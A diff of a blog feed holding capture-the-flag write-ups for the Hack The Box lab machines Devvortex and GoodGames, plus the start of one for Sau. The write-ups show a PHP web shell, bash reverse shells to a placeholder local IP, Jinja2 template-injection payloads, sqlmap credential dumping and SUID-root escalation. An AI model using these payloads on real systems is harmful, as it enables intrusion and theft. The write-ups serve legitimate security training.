+<p>We can run a nmap to scan the ports on the target ip.</p>
+<p><code>nmap -sS &lt;target_ip&gt;</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-14-8759210d29fdcde3c50e019b6d29d7a1.png" width="1408" height="472" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="https://danae-pan.github.io/Blog/blog/Devvortex#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
+<p>What subdomain is configured on the target's web server?</p>
+<p>Navigating to the ip address on the browser we get this nice screen.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-15-9b45af95772d0e212cb36bcfb30d249e.png" width="1058" height="714" class="img_ev3q"></p>
+<p>This seems that the hostname cannot be resolved. Lets edit the /etc/hosts file to add the ip address to be resolved to the target domain.</p>
+<p><code>sudo vim /etc/hosts</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-16-9e8c637714a5d2786923a81b75d17d1e.png" width="1294" height="660" class="img_ev3q"></p>
+<p>Then for finding the subdomain, we can use gobuster vhost since it is often that htb machine will use name-based virtual hosting, that is when multiple names run on a single ip address.</p>
+<p><code>gobuster vhost -u https://devvortex.htb/ -w usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-17-94c2d53fb65e816a4eeb82008cdbbb59.png" width="1608" height="1082" class="img_ev3q"></p>
+<p>We now found the subdomain <code>dev.devvortex.htb</code>.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="https://danae-pan.github.io/Blog/blog/Devvortex#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
+<p>What Content Management System (CMS) is running on dev.devvortex.htb?</p>
+<p>We need to add the previous subdomain we found on the hosts file as well so again, we use the command <code>sudo vim /etc/hosts</code>.</p>
+<p>For finding the CMS, we can use WhatWeb.</p>
+<p>After navigating to <code>usr/bin</code> directory we can run <code>whatweb -a 3 dev.devvortex.htb -v</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-18-78a12e56ddd0a78b24535466bc1f64b5.png" width="804" height="202" class="img_ev3q"></p>
+<p>From this search, we could not find the CMS. We can try to dig further on the website by doing a gobuster dir seach to explore further endpoints.</p>
+<p><code>gobuster dir -u http://dev.devvortex.htb -w common.txt</code></p>
+<p>From this search we found many endpoints with different status code that will be useful in the following task, one of them is the /administrator endpoint which is usually an interesting finding.</p>
+<p>Navigating there we see a usual administrator login that reveals that the CMS used is Joomla.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-19-6c50c0f44641186342eefdf28d587e5e.png" width="787" height="588" class="img_ev3q"></p>
+<p>We csn also find this  looking in the /robots.txt endpoint which is a file that contains the redirections and other info.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-20-45ed18a4a4c42b9bce658a5620b06605.png" width="787" height="588" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="https://danae-pan.github.io/Blog/blog/Devvortex#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
+<p>Which version of Joomla is running on the target system?</p>
+<p>The information about Joomla version is usually on a public facing file that is located on different paths depending on the version of Joomla. It is often that the information is stores under modules diretory or under libraries but this varies. After a google search lookup we find different sources including <a href="https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website" target="_blank" rel="noopener noreferrer">https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website</a>. Finally, navigating to <code>http://dev.devvortex.htb/administrator/manifests/files/joomla.xml</code> we find the Joomla version.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-22-27f019de9f4d33ee6d729ecc281f18cb.png" width="968" height="613" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="https://danae-pan.github.io/Blog/blog/Devvortex#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
+<p>What is the 2023 CVE ID for an information disclosure vulnerability in the version of Joomla running on DevVortex?</p>
+<p>Searching google for vulnerabilities of the specific Joomla version we found, we quickly find that the CVE-2023-23752 that affects a series of Joomla version including ours.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="https://danae-pan.github.io/Blog/blog/Devvortex#task-6" class="hash-link" aria-label="Direct link to Task 6" title="Direct link to Task 6">​</a></h3>
+<p>What is the lewis user's password for the CMS?</p>
+<p>We launch metasploit <code>msfconsole</code> and search for the cve we found before.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-21-71975af2cc875a8b1f3fba7ff4f926bc.png" width="814" height="413" class="img_ev3q"></p>
+<p>We then <code>use 0</code> to select the options, then <code>set RHOSTS dev.devvortex.htb</code> to set the target host and finally <code>run</code> to run the auxiliary. From this, we successfully get the user's password.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-23-460ec15c6e4f76d5a3dcf2727a14b02d.png" width="793" height="325" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-7">Task 7<a href="https://danae-pan.github.io/Blog/blog/Devvortex#task-7" class="hash-link" aria-label="Direct link to Task 7" title="Direct link to Task 7">​</a></h3>
+<p>We can use the credentials from previously to login as administrator on the /administrator endpoint. Navigating to System page we find that there is the template option. Under Site Templates we edit the Cassiopeia Details and Files.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-24-5133e5da53d77150b3f69c5011b3d9f0.png" width="1045" height="517" class="img_ev3q"></p>
+<p>We add this line of code <code>system($_GET['cmd']);</code> on the error.php file to get a reverse shell. Before navigating to  <code>http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=bash -c "bash -i &gt;%26 /dev/tcp/&lt;local_ip&gt;/4444 0&gt;%261"</code> we need to open a port listening for connections. We can do this by <code>nc -lnvp 4444</code>. After navigating to that url, we obtain a shell.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-26-72e40dce133041c12a356b8cce509ec6.png" width="812" height="153" class="img_ev3q"></p>
+<p>First we spawn a proper shell so we don't get stuck onwards.</p>
+<p><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+<p>We can now connect to the database with the credential we found before.</p>
+<p><code>mysql -u lewis -p</code>
+P4ntherg0t1n5r3c0n##</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-27-cd620f993561d755d1a59ba6ede6e568.png" width="812" height="499" class="img_ev3q"></p>
+<p>We list all tables by <code>show tables;</code> and then <code>describe sd4fg_users;</code> to see all fields for the user. There, we identfy that this is the table we are asked for by <code>select username, id, password from sd4fg_users where username = 'logan';</code> and see the hashed password.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-28-e36283cc91dc609ddd59344035ce6744.png" width="754" height="580" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-8">Task 8<a href="https://danae-pan.github.io/Blog/blog/Devvortex#task-8" class="hash-link" aria-label="Direct link to Task 8" title="Direct link to Task 8">​</a></h3>
+<p>From the previous task, we listed the hashed password for the logan user by using the select command. We open a new terminal and store this password on a file named <code>logan.hash</code> and then we can use john the ripper to crack the password so we can obtain the plain text from the hashed version.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-29-0e34053de210192c7f4ab444d5563b83.png" width="1610" height="578" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-9">Task 9<a href="https://danae-pan.github.io/Blog/blog/Devvortex#task-9" class="hash-link" aria-label="Direct link to Task 9" title="Direct link to Task 9">​</a></h3>
+<p>Submit the flag located in the logan user's home directory.</p>
+<p>With the password we found from the previous task, we ssh to the server with the user logan.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-30-de20217ae3fed9678f6851340e117d05.png" width="1610" height="578" class="img_ev3q"></p>
+<p>In this user's home directory we find the user.txt that contains the user's flag.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-10">Task 10<a href="https://danae-pan.github.io/Blog/blog/Devvortex#task-10" class="hash-link" aria-label="Direct link to Task 10" title="Direct link to Task 10">​</a></h3>
+<p>What is the full path to the binary that the lewis user can run with root privileges using sudo?</p>
+<p>We can find the path by running <code>sudo -l</code>.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-31-2774395f6e143f326ba75509ac49d5ae.png" width="1610" height="456" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-11">Task 11<a href="https://danae-pan.github.io/Blog/blog/Devvortex#task-11" class="hash-link" aria-label="Direct link to Task 11" title="Direct link to Task 11">​</a></h3>
+<p>What is the 2023 CVE ID of the privilege escalation vulnerability in the installed version of apport-cli?</p>
+<p>With a google search, we find the id of the CVE to be CVE-2023-1326.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-12">Task 12<a href="https://danae-pan.github.io/Blog/blog/Devvortex#task-12" class="hash-link" aria-label="Direct link to Task 12" title="Direct link to Task 12">​</a></h3>
+<p>Submit the flag located in the root user's home directory.</p>
+<p>We start by running sudo /usr/bin/apport-cli --file-bug
+<img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-32-853911cd2d598657383990bb52fd72b2.png" width="1630" height="970" class="img_ev3q"></p>
+<p>There we press any key:</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-33-8fa8c993c1d0396725c49f0b6a2db071.png" width="1614" height="1146" class="img_ev3q"></p>
+<p>Then we press any key, and finally the option of view report (V) where we land in a text viewer and obtain the root shell by running <code>!/bin/bash</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-d-34-559efc57d3d9ac694ddef2e34558957b.png" width="1630" height="970" class="img_ev3q"></p>
+<p>In the home directory of the root user we find the root.txt which contains the root's flag.</p>]]></content>
+        <category label="easy" term="easy"/>
+        <category label="linux" term="linux"/>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Good Games]]></title>
+        <id>https://danae-pan.github.io/Blog/blog/GoodGames</id>
+        <link href="https://danae-pan.github.io/Blog/blog/GoodGames"/>
+        <updated>2025-04-20T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Task 1]]></summary>
+        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="https://danae-pan.github.io/Blog/blog/GoodGames#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
+<p>Submit User Flag</p>
+<p>We use nmap to find the services on the target machine and we see that an apache server runs on port 80.</p>
+<p><code>nmap -sV target_ip</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-g-619aec147bcca7992c4a856afd59376d.png" width="800" height="325" class="img_ev3q"></p>
+<p>Navigating to the browser we see a login page where we will try bypassing the authentication using SQL injection.</p>
+<p>Server-Side Template Injection (SSTI) vulnerability arises when an application incorporates user-supplied input directly into its server-side templates without proper sanitization or validation. Template engines, which combine templates with dynamic data to generate web pages, can be exploited through SSTI attacks.</p>
+<p>To find forms that are candidates for sql injection run</p>
+<p><code>sqlmap -u "http://10.129.51.14/" --forms --crawl=2 --dbms=mysql</code></p>
+<p>--crawl=CRAWLDEPTH: crawls the website starting from the target url</p>
+<p>We find a total of 8 targets. One of the identified forms is the login form and sqlmap auto-filled blank fields, tried multiple techniques and identified that the email field is vulnerable to time-based blind SQL injection.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-g-3-8ddec9f638f40155c2cfce60b335ca99.png" width="816" height="485" class="img_ev3q"></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-g-5-14f9524c6351ec8b2949c6aabdb1699a.png" width="816" height="264" class="img_ev3q"></p>
+<p>After confirming the vulnerability we want to enumerate the database and find the table storing the usernames and passwords to get the user flag.</p>
+<p>We can try running the following command to retrieve the databse names.</p>
+<p><code>sqlmap -u "http://10.129.51.14/login" --data="email=*&amp;password=test123" --dbs</code></p>
+<p>We found 2 available databases named information_schema and main.</p>
+<p>Next, we will list the tables from each.</p>
+<p><code>sqlmap -u "http://10.129.51.14/login" --data="email=*&amp;password=test123/login" -D &lt;database_name&gt; --tables</code></p>
+<p>Starting with the database named main, we find 3 tables blog, blog_comments and user and which we can further investigate.
+We start with the table user.</p>
+<p><code>sqlmap -u "http://10.129.51.14/login" --data="email=*&amp;password=test123/login" -D main -T user --columns</code></p>
+<p>There, we find 4 columns in total with a column named email and a column name password that might get us the flags we need.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-g-9-708f4e42c7a8b057b1491a527b02dd4c.png" width="1228" height="536" class="img_ev3q"></p>
+<p>We then run the following command to retreive that information.</p>
+<p><code>sqlmap -u "http://10.129.51.14/login" --data="email=*&amp;password=test123/login" -D main -T user -C email,password --dump</code></p>
+<p>We find the email and the password and with those credentials we login after we use a hash cracker to find the plain texts password from the hashed one.</p>
+<p>Now that we are logged in as admin, we can see a gear on the top right that redirects as to internal-administration.goodgames.htb. We need to edit the /etc/hosts file to point this domain to the target machine's IP.
+Note, editing the hosts file requires administrative privileges.</p>
+<p>Following the url, we see a login page:
+<img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-g-10-3bbc2422ba2194b241164d73cc3cc2df.png" width="1178" height="1000" class="img_ev3q"></p>
+<p>There we reuse the credentials that we found on the previous step, where admin is the username.
+We are presented with a dashborad for the admin.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-g-11-847dbb40ceb4806ac34aceaa816cb947.png" width="2122" height="1000" class="img_ev3q"></p>
+<p>After we are in we attempt to find a palce where sql injection is possible. Navigating to the settings page,
+we see the general information where we can try sql injection on the field of the full name.
+We try the usual test of ' OR 1=1 --- and we see this renders as the full name. We then try {<!-- -->2<!-- -->} for Jinja2 (Python) and we see this results to two,
+so we confirm SSTI (Server Side Template Injection) which can lead to an RCE.
+Now we can go on with jinja2 exploitation.</p>
+<p>First we open a port locally:</p>
+<p><code>nc -lvnp 4343</code></p>
+<p>Different ways using some python libraries to exploit including:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>Or in the shotest versions:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">{{ cycler.__init__.__globals__.os.popen('id').read() }}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">{{ joiner.__init__.__globals__.os.popen('id').read() }}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">{{ namespace.__init__.__globals__.os.popen('id').read() }}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>We used
+<code>{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i &gt;&amp; /dev/tcp/&lt;local_ip&gt;/&lt;exposed_port&gt; 0&gt;&amp;1"').read() }}</code></p>
+<p>We now got the root control of the server</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-g-13-8fe182bc64b3755a649dfde16e3292a3.png" width="1624" height="356" class="img_ev3q"></p>
+<p>We can then navigate to /home/augustus where we find the user.text, in which the user flag is user flag is located.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="https://danae-pan.github.io/Blog/blog/GoodGames#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
+<p>But since we are already a root user but not finding any root.txt under the /root directory, we might be inside a container.</p>
+<p>We can invistigate the cgroup file under the proc folder that contains all processes.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-g-15-4d8c36c0f79ff0d58fa5290d320af8ae.png" width="1624" height="1100" class="img_ev3q"></p>
+<p>From this file, we understand that we are inside a docker container. So, we need to access the host from the container which is known as container escape or breakout.</p>
+<p>One way of container gaining access to host file systems, is if they areconfigured to run with the SYS_ADMIN capability which allows
+containers to perform actions through the linux kernel that would be available only to root users on a linux server.</p>
+<p>capa=<code>cat /proc/1/status | grep -i 'CapEff' | awk '{print $2}'</code>; capsh --decode=$capa</p>
+<p>grep CapEff /proc/$$/status</p>
+<p>CapEff this set represents all the capabilities the process is using at a specific moment in time.
+Then we need to decode the permitted capcbility using capsh.</p>
+<p><code>capsh -- decode=xxxxxx00000000a80425fb</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-g-16-b7a6ca6d404905a3de370767b7d77959.png" width="1624" height="210" class="img_ev3q"></p>
+<p>After decoding, we see that the cap_sys_admin capability is not there, so we cannot use this to escape the container.</p>
+<p>We then can try ssh to the host machine using the username augustus and the password we had before found for the admin
+<code>ssh augustus@172.19.0.1</code></p>
+<p>And it works!</p>
+<p>Since the container mounts /home/augustus from the host anything the container writes in this directory, is also visible on the host and vice versa.</p>
+<p>Having said that we can follow the next steps to create a SUID-root bash binary on the host via a shared volume.
+While in the host we copy the /bin/bash to the current dirrectory <code>cp /bin/bash .</code>.
+Then inside the container we can:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">chown root:root /home/augustus/bash</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">chmod 4777 /home/augustus/bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>Now going back to host, we run <code>./bash -p</code> to get a root shell and finally get the root flag.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-g-18-0ec48d0f47799d25b3a8ea8d10dc55c4.png" width="1624" height="656" class="img_ev3q"></p>
+<p>What is blind SQL injection?</p>
+<p>Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
+Many techniques as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the inkected query within the application's responses.</p>]]></content>
+        <category label="easy" term="easy"/>
+        <category label="windows" term="windows"/>
     </entry>
     <entry>
         <title type="html"><![CDATA[Sau]]></title>
-        <id>Sau</id>
+        <id>https://danae-pan.github.io/Blog/blog/Sau</id>
         <link href="https://danae-pan.github.io/Blog/blog/Sau"/>
-        <updated>2025-04-04T21:17:13.000Z</updated>
+        <updated>2025-04-12T00:00:00.000Z</updated>
         <summary type="html"><![CDATA[Task 1]]></summary>
+        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="https://danae-pan.github.io/Blog/blog/Sau#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
+<p>Which is the highest open TCP port on the target machine?</p>
+<p>We can use nmap to scan ports in the target machine.</p>
+<p><code>nmap -sS -p- &lt;target_ip&gt;</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-224011b8b5aac988db9a21e7fd05ded8.png" width="679" height="263" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="https://danae-pan.github.io/Blog/blog/Sau#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
+<p>What is the name of the open source software that the application on 55555 is "powered by"?</p>
+<p>To find information about the software, we can run nmap again with the additional field <strong>-sV</strong>.</p>
+<p><code>nmap -sV -p &lt;target_port&gt; &lt;target_ip&gt;</code></p>
+<p>From the result we see that the service is identified as uknown. Even so, we can infer from the fingerprint that is returned that the service is HTTP-based since it responds with HTTP headers. Part of the response is illustrated bellow:</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-1-2a2168509ff9c603494405196eb80e16.png" width="787" height="526" class="img_ev3q"></p>
+<p>We can then navigate to the ip address on the browser and at the bottom of the page we can find the open source software the application is powered by.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARkAAAAeCAYAAAAYYmobAAABWmlDQ1BJQ0MgUHJvZmlsZQAAKJF1kD1IA0EQhV/+SPxBBC0tAmIRiBJjBC3PICJYHInxr/KyiZfg5Vw2JyLYWtlYiLWF2Fom2ijYWAgpBAWxF2vhGg3rbKImUdxlmI/H29nHAN6QwbnlB1CyHZGamwmvrK6Fg6/wIkQ3gmGDlbmm6wtkwXfvPO4DPKrfj6pZl/u14u2Nu17rOt88qfqe//o7TncuX2bUP6hijAsH8ESJ9R2HK94jHhQUivhQsdnkU8XZJlcbnsVUkviOuJ8VjByx+juabdPNNi5Z2+wrg0rfm7czaTWHagga0shQhbEEHXEkMP2PP9HwJ7EFjl0IFGGiAIdeaqRwWMgTz8MGwxiixHHEqCbVnn/vr6XZs8BUAPCJlpY9Ai5eKPpBSxuhvfUNAFfj3BDGz1Y9rr+8MRFvck8FCBxL+bYMBCNA/VHK94qU9TOa/wRcu59WP2SMmcAdDAAAAFZlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA5KGAAcAAAASAAAARKACAAQAAAABAAABGaADAAQAAAABAAAAHgAAAABBU0NJSQAAAFNjcmVlbnNob3RK0QPlAAAB1WlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNi4wLjAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDxleGlmOlBpeGVsWURpbWVuc2lvbj4zMDwvZXhpZjpQaXhlbFlEaW1lbnNpb24+CiAgICAgICAgIDxleGlmOlBpeGVsWERpbWVuc2lvbj4yODE8L2V4aWY6UGl4ZWxYRGltZW5zaW9uPgogICAgICAgICA8ZXhpZjpVc2VyQ29tbWVudD5TY3JlZW5zaG90PC9leGlmOlVzZXJDb21tZW50PgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KAatQ5AAAGk1JREFUeAHtXWl0XMWV/nrVvq+WtdiyZMuW90XCshFggwE7bGENSSAkExKSnEw4h0xm8mvOLGfOYQhDmEOGMGECmBCww2ZsB9scFm+SbMs2siRrsSRr3/elW+rlzb31XnW/brWEsFH8gy4d93uvqu5S371161a97mNDekamgmAJIhBEIIjAPCFgnCe+QbZBBIIIBBEQCASDTNARgggEEZhXBIJBZl7hDTIPIhBEIBhkgj4QRCCIwLwiEAwy8wpvkHkQgSACwSAT9IEgAkEE5hWBYJCZV3iDzIMIBBEIBpmgDwQRCCIwrwgEg8y8whtkHkQgiIApJib2nw342//BnIztj9yH+4tWY/Om1diyaSU25KYhytaLloFJssw862QwkgRVCrvBbNIUA/U0xqHogW1IaWtAx5QbRvoTNNF5eOieReirase4rJvGzStL0BgU6qHRT+tLPbR2lqvKCaxfIL1VmkCj+QKZHj2MsC5/GIsTOjDYb/fUqhxNiNr1P8izfoKeXieL92sPJJfrfMcv6ZD7U2wpNqCtpg0K2UOPiOzjy9EkdFsU344hj25GoiXzCE1ojAYT/WMqqZsRqYVbsGysDV3kVpKfYs3A7Y/ehAXtDWgdd3vqDfFr8OhDyzBR3YpBN9frtZLUvDarX5SXNfqrOhbSKWUtHtsej4b6PkyRkuqfXl9Z53ud2YbUT+e3TKVELMC6LBO6B9hW/rrSc2gCNmy7CffetBEFK7OQZBhFe+8YnJo+MFIfGorga6DxRqRhbZaF+NkEgmyHqy3XNJNxuwdx/K3X8Zvf/QlPv7gHr54YQEZxEdbEmL3jooETAt5nulM0A3sq/do99YFumB8VRSFATWoHNtZsxSh/eOFWb4yKFzZF4TrSyMNC66zT281W1Bcdvb7aZSaFWJhPux+tpj/TBdJb1dWjDNzaLYcYUeaAlSExH7HxoR5aldDvk/TwyPfo5JXr29t3DB46XScPxro6/1vG0ZCwCnEJYTofUARkal+yC9tD2MSf2u95qgs1TVYsWxxHDVI/A2Ky0hDT3opmJ/mJjx2YXo6P0VT/FJ6kfvY1snzCWRmsxwfHmjCu+Y2qgV5ftYY/hU9rtpmOhZTLHaWudGsOR87GAmxNjxLhBVB928vVgLSNxVjvrMLuV/fgd+9dgHNVMW5MD9G60BiEbsSf+CqmSGQLfhEaPy+nq7nTzearYXNltAymmyIzQ2x0uzDcegn1E9lIjqGGYQOis9fhlsLFSAl1YaS1Fh8dv4ie1AI8vnoEf/rgIkYs6dj5yI2IPbUPf64YhWnRZjyxfgivvluF0aiF2Hz9RqxKCYVhpBOnjp3Cue4pRKy4GXeHN6AmaTXyB0qx+9QgEpZvwI51mYizOtB98SwOnW7GqNOIsIUrsOP6FUgPd6C/sR1jhFZHgKEqCEVW4Q7ctTIBpuFeXCgtw4lWGwXMu1HUfxhvVY4RlQFJ192BXe4TeOVUr+qv5MRu8wrk/ng7xj8ZR9r2RHT+4Wm0m1cj6xuPYuHCBBgHz6P54Eto75ggp0pC3PYnkLcqF8poJXqagBTLIZQeBvL+vhi9z/4W/RRVXNYNWPnzzeh57nn00ThMWd9A7q23Iy7GClfzX1F/8G0Mkk